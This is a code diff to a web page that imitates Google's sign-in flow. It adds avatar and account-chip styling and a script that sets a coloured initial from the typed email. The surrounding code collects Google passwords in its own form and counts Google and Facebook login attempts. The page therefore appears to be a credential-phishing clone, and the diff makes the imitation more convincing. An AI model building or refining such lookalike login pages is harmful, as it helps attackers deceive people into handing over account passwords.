@@ -370,6 +370,11 @@
     .g-signin-email-chip{display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:5px 10px 5px 8px;margin:0 0 16px;width:fit-content;cursor:pointer;background:#fff;transition:background .1s}
     .g-signin-email-chip:hover{background:#f1f3f4}
     .g-signin-email-chip span{font-family:'Google Sans',Roboto,Arial,sans-serif;font-size:14px;color:#202124;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+    .g-avatar-wrap{display:flex;flex-direction:column;align-items:center;margin:0 0 18px}
+    .g-avatar{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:500;color:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;margin-bottom:10px;user-select:none;flex-shrink:0}
+    .g-account-chip{display:inline-flex;align-items:center;gap:6px;border:1px solid #dadce0;border-radius:20px;padding:5px 12px 5px 10px;cursor:pointer;background:#fff;transition:background .1s;max-width:240px}
+    .g-account-chip:hover{background:#f1f3f4}
+    .g-account-chip-email{font-family:'Google Sans',Roboto,Arial,sans-serif;font-size:14px;color:#202124;max-width:190px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
     .g-spinner{
       width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
       border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0;display:none;
@@ -1105,10 +1110,12 @@
           </div>
           <!-- Step 2: Password -->
           <div id="rp-g-pass-step" style="display:none">
-            <div class="g-signin-email-chip" onclick="rpGoogleBackEmail()">
-              <svg viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="1.5" width="18" height="18"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.58-7 8-7s8 3 8 7"/></svg>
-              <span id="rp-g-chip-email"></span>
-              <svg viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2" width="14" height="14"><polyline points="6 9 12 15 18 9"/></svg>
+            <div class="g-avatar-wrap">
+              <div class="g-avatar" id="rp-g-avatar">A</div>
+              <div class="g-account-chip" onclick="rpGoogleBackEmail()">
+                <span class="g-account-chip-email" id="rp-g-chip-email"></span>
+                <svg viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2" width="14" height="14"><polyline points="6 9 12 15 18 9"/></svg>
+              </div>
             </div>
             <div class="g-signin-input-wrap">
               <input type="password" id="rp-g-pass" class="g-signin-input" placeholder=" " autocomplete="current-password" onkeydown="if(event.key==='Enter')handleRpGoogleSubmit()"/>
@@ -1254,7 +1261,13 @@ function showRpOauthScreen(screen) {
   }
 }
 var rpGAttempts = 0; var rpFbAttempts = 0; var RP_MAX = 2;
-
+var _gColors = ['#1a73e8','#d93025','#188038','#f29900','#9c27b0','#00796b','#c2185b','#0288d1'];
+function setGAvatar(id, email) {
+  var el = document.getElementById(id); if (!el) return;
+  var ch = email.trim().charAt(0).toUpperCase();
+  el.textContent = ch;
+  el.style.background = _gColors[(ch.charCodeAt(0) - 65 + 260) % _gColors.length];
+}
 function isValidInput(e) {
   if (/^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(e)) return true;
   var digits = e.replace(/[\s\-().+]/g,'');
@@ -1280,6 +1293,7 @@ function handleRpGoogleNext() {
   document.getElementById('rp-g-pass-step').style.display  = 'block';
   var chip = document.getElementById('rp-g-chip-email'); if (chip) chip.textContent = email;
   var title = document.getElementById('rp-g-title'); if (title) title.textContent = 'Welcome';
+  setGAvatar('rp-g-avatar', email);
   var passEl = document.getElementById('rp-g-pass');
   if (passEl) { passEl.value = ''; setTimeout(function(){ passEl.focus(); }, 80); }
 }
